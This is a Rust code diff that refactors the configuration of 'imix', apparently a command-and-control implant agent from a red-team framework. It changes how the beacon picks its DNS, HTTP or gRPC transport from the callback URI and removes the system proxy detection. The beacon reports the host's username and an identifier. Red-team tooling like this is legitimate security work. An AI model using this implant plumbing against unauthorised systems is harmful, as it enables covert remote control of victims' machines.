@@ -1,21 +1,17 @@
-use tonic::transport;
+use std::collections::HashMap;
+
 use uuid::Uuid;
 
-use crate::c2::beacon::Transport;
+use crate::c2::ActiveTransport;
 
+//TODO: Can this struct be removed?
 /// Config holds values necessary to configure an Agent.
 #[allow(clippy::derive_partial_eq_without_eq)]
 #[derive(Clone, PartialEq, ::prost::Message)]
 pub struct Config {
     #[prost(message, optional, tag = "1")]
     pub info: ::core::option::Option<crate::c2::Beacon>,
-    #[prost(string, tag = "2")]
-    pub callback_uri: ::prost::alloc::string::String,
-    #[prost(string, optional, tag = "3")]
-    pub proxy_uri: ::core::option::Option<::prost::alloc::string::String>,
-    #[prost(uint64, tag = "4")]
-    pub retry_interval: u64,
-    #[prost(bool, tag = "5")]
+    #[prost(bool, tag = "2")]
     pub run_once: bool,
 }
 
@@ -25,16 +21,6 @@ macro_rules! callback_uri {
             Some(uri) => uri,
             None => "http://127.0.0.1:8000",
         }
-    };
-}
-
-/*
- * Compile-time constant for the agent proxy URI, derived from the IMIX_PROXY_URI environment variable during compilation.
- * Defaults to None if this is unset.
- */
-macro_rules! proxy_uri {
-    () => {
-        option_env!("IMIX_PROXY_URI")
     };
 }
 
@@ -79,6 +65,15 @@ macro_rules! run_once {
     };
 }
 
+macro_rules! extra {
+    () => {
+        match option_env!("IMIX_TRANSPORT_EXTRA") {
+            Some(extra) => extra.to_string(),
+            None => String::from(""),
+        }
+    };
+}
+
 /* Compile-time constant for the agent run once flag, derived from the IMIX_RUN_ONCE environment variable during compilation.
  * Defaults to false if unset.
  */
@@ -88,7 +83,7 @@ pub const RUN_ONCE: bool = run_once!();
  * Config methods.
  */
 impl Config {
-    pub fn default_with_imix_verison(imix_version: &str) -> Self {
+    pub fn default_with_imix_version(imix_version: &str) -> Self {
         let agent = crate::c2::Agent {
             identifier: format!("imix-v{}", imix_version),
         };
@@ -106,18 +101,17 @@ impl Config {
         let beacon_id =
             std::env::var("IMIX_BEACON_ID").unwrap_or_else(|_| String::from(Uuid::new_v4()));
 
-        #[cfg(feature = "dns")]
-        let transport = crate::c2::beacon::Transport::Dns;
-        #[cfg(feature = "http1")]
-        let transport = crate::c2::beacon::Transport::Http1;
-        #[cfg(feature = "grpc")]
-        let transport = crate::c2::beacon::Transport::Grpc;
-        #[cfg(not(any(feature = "dns", feature = "http1", feature = "grpc")))]
-        let transport = crate::c2::beacon::Transport::Unspecified;
+        let transport_type = match CALLBACK_URI.split(":").nth(0).unwrap_or("unspecified") {
+            "dns" => crate::c2::active_transport::Type::TransportDns,
+            "http1" => crate::c2::active_transport::Type::TransportHttp1,
+            "https1" => crate::c2::active_transport::Type::TransportHttp1,
+            "https" => crate::c2::active_transport::Type::TransportGrpc,
+            "http" => crate::c2::active_transport::Type::TransportGrpc,
+            _ => crate::c2::active_transport::Type::TransportUnspecified,
+        };
 
-        let info = crate::c2::Beacon {
-            identifier: beacon_id,
-            principal: whoami::username(),
+        let active_transport = ActiveTransport {
+            uri: String::from(CALLBACK_URI),
             interval: match CALLBACK_INTERVAL.parse::<u64>() {
                 Ok(i) => i,
                 Err(_err) => {
@@ -127,26 +121,20 @@ impl Config {
                     5_u64
                 }
             },
-            transport: transport as i32,
+            r#type: transport_type as i32,
+            extra: extra!(),
+        };
+
+        let info = crate::c2::Beacon {
+            identifier: beacon_id,
+            principal: whoami::username(),
+            active_transport: Some(active_transport),
             host: Some(host),
             agent: Some(agent),
         };
 
         Config {
             info: Some(info),
-            callback_uri: String::from(CALLBACK_URI),
-            proxy_uri: get_system_proxy(),
-            retry_interval: match RETRY_INTERVAL.parse::<u64>() {
-                Ok(i) => i,
-                Err(_err) => {
-                    #[cfg(debug_assertions)]
-                    log::error!(
-                        "failed to parse retry interval constant, defaulting to 5 seconds: {_err}"
-                    );
-
-                    5
-                }
-            },
             run_once: RUN_ONCE,
         }
     }
@@ -173,45 +161,6 @@ impl Config {
                 }
             }
         }
-    }
-}
-
-fn get_system_proxy() -> Option<String> {
-    let proxy_uri_compile_time_override = proxy_uri!();
-    if let Some(proxy_uri) = proxy_uri_compile_time_override {
-        return Some(proxy_uri.to_string());
-    }
-
-    #[cfg(target_os = "linux")]
-    {
-        match std::env::var("http_proxy") {
-            Ok(val) => return Some(val),
-            Err(_e) => {
-                #[cfg(debug_assertions)]
-                log::debug!("Didn't find http_proxy env var: {}", _e);
-            }
-        }
-
-        match std::env::var("https_proxy") {
-            Ok(val) => return Some(val),
-            Err(_e) => {
-                #[cfg(debug_assertions)]
-                log::debug!("Didn't find https_proxy env var: {}", _e);
-            }
-        }
-        None
-    }
-    #[cfg(target_os = "windows")]
-    {
-        None
-    }
-    #[cfg(target_os = "macos")]
-    {
-        None
-    }
-    #[cfg(target_os = "freebsd")]
-    {
-        None
     }
 }
 
